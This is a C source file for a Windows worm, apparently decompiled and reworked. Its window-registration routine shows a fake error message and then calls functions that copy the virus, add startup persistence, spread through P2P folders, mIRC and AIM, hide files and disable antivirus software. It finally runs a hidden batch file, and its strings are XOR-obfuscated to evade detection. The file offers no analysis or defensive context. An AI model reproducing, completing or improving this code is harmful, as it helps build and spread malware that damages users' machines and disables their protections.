#include "data_globals.h"
#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}


#include <windows.h>
#include <stdint.h>

void _MyRegisterClass(HINSTANCE param_1)
{
    WNDCLASSEXA local_3c;

    local_3c.cbSize = sizeof(WNDCLASSEXA);
    local_3c.style = CS_HREDRAW | CS_VREDRAW;
    local_3c.lpfnWndProc = _WndProc_16;
    local_3c.cbClsExtra = 0;
    local_3c.cbWndExtra = 0;
    local_3c.hInstance = param_1;
    local_3c.hIcon = LoadIconA(param_1, (LPCSTR)0x7f00);
    local_3c.hCursor = LoadCursorA((HINSTANCE)0x0, (LPCSTR)0x7f00);
    local_3c.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    local_3c.lpszMenuName = NULL;
    local_3c.lpszClassName = _szWindowClass;
    local_3c.hIconSm = LoadIconA(local_3c.hInstance, (LPCSTR)0x7f00);

    // Obfuscated error message with key 0x3E
    volatile char sz_error_msg[] = {
        'T'^0x3E, 'h'^0x3E, 'i'^0x3E, 's'^0x3E, ' '^0x3E, 'p'^0x3E, 'r'^0x3E, 'o'^0x3E, 'g'^0x3E, 'r'^0x3E, 'a'^0x3E, 'm'^0x3E, ' '^0x3E,
        'h'^0x3E, 'a'^0x3E, 's'^0x3E, ' '^0x3E, 'e'^0x3E, 'n'^0x3E, 'c'^0x3E, 'o'^0x3E, 'u'^0x3E, 'n'^0x3E, 't'^0x3E, 'e'^0x3E, 'r'^0x3E, 'e'^0x3E, 'd'^0x3E, ' '^0x3E,
        'a'^0x3E, 'n'^0x3E, ' '^0x3E, 'e'^0x3E, 'r'^0x3E, 'r'^0x3E, 'o'^0x3E, 'r'^0x3E, ' '^0x3E, 'a'^0x3E, 'n'^0x3E, 'd'^0x3E, ' '^0x3E,
        'n'^0x3E, 'e'^0x3E, 'e'^0x3E, 'd'^0x3E, 's'^0x3E, ' '^0x3E, 't'^0x3E, 'o'^0x3E, ' '^0x3E, 'c'^0x3E, 'l'^0x3E, 'o'^0x3E, 's'^0x3E, 'e'^0x3E, ','^0x3E, ' '^0x3E,
        'p'^0x3E, 'l'^0x3E, 'e'^0x3E, 'a'^0x3E, 's'^0x3E, 'e'^0x3E, ' '^0x3E, 't'^0x3E, 'r'^0x3E, 'y'^0x3E, ' '^0x3E, 'a'^0x3E, 'g'^0x3E, 'a'^0x3E, 'i'^0x3E, 'n'^0x3E, '.'^0x3E, ' '^0x3E,
        'I'^0x3E, 'f'^0x3E, ' '^0x3E, 't'^0x3E, 'h'^0x3E, 'e'^0x3E, ' '^0x3E, 'p'^0x3E, 'r'^0x3E, 'o'^0x3E, 'b'^0x3E, 'l'^0x3E, 'e'^0x3E, 'm'^0x3E, ' '^0x3E,
        'p'^0x3E, 'e'^0x3E, 'r'^0x3E, 's'^0x3E, 'i'^0x3E, 's'^0x3E, 't'^0x3E, 's'^0x3E, ' '^0x3E, 't'^0x3E, 'r'^0x3E, 'y'^0x3E, ' '^0x3E,
        'r'^0x3E, 'e'^0x3E, 's'^0x3E, 't'^0x3E, 'a'^0x3E, 'r'^0x3E, 't'^0x3E, 'i'^0x3E, 'n'^0x3E, 'g'^0x3E, ' '^0x3E, 'y'^0x3E, 'o'^0x3E, 'u'^0x3E, 'r'^0x3E, ' '^0x3E,
        'c'^0x3E, 'o'^0x3E, 'm'^0x3E, 'p'^0x3E, 'u'^0x3E, 't'^0x3E, 'e'^0x3E, 'r'^0x3E, '.'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_error_msg, sizeof(sz_error_msg), 0x3E);

    // Obfuscated "Error" with key 0x7A
    volatile char sz_error_caption[] = { 'E'^0x7A, 'r'^0x7A, 'r'^0x7A, 'o'^0x7A, 'r'^0x7A, 0x00^0x7A };
    xor_decrypt(sz_error_caption, sizeof(sz_error_caption), 0x7A);

    MessageBoxA(_hWnd, (char*)sz_error_msg, (char*)sz_error_caption, MB_ICONERROR);
    _GetVirus();
    _CopyVirus();
    _WinStartup();
    _P2PCopy();
    _FindmIRC();
    _WriteBatch();
    _FindAIM();
    _HideFiles();
    _DestroyAVs();

    // Obfuscated "BBbLWDB.Bat" with key 0x1F
    volatile char sz_bat[] = { 'B'^0x1F, 'B'^0x1F, 'b'^0x1F, 'L'^0x1F, 'W'^0x1F, 'D'^0x1F, 'B'^0x1F, '.'^0x1F, 'B'^0x1F, 'a'^0x1F, 't'^0x1F, 0x00^0x1F };
    xor_decrypt(sz_bat, sizeof(sz_bat), 0x1F);

    ShellExecuteA(_hWnd, "open", (char*)sz_bat, NULL, NULL, SW_HIDE);
    RegisterClassExA(&local_3c);
}
#pragma optimize("", on)
